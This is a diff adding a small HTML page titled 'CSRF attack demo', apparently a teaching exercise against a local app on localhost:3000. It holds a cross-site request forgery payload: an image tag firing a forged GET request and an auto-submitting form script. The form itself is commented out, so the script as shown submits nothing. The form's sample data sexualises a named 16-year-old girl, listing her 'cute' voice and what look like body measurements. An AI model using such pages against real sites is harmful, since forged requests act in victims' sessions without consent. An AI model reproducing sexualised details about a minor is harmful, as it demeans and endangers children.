@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>csrf攻击演示</title>
+</head>
+
+<body>
+    <h1>csrf攻击演示</h1>
+    <img src="http://localhost:3000/laopos">
+    <!-- <form action="http://localhost:3000/laopos/add" method="post">
+        <input type="text" name="name" value="何依婷">
+        <input type="text" name="age" value="16">
+        <input type="text" name="sex" value="女">
+        <input type="text" name="voice" value="夹子音">
+        <input type="text" name="angel" value="90/67/88">
+    </form> -->
+    <script>
+        document.forms[0].submit()
+    </script>
+</body>
+
+</html>
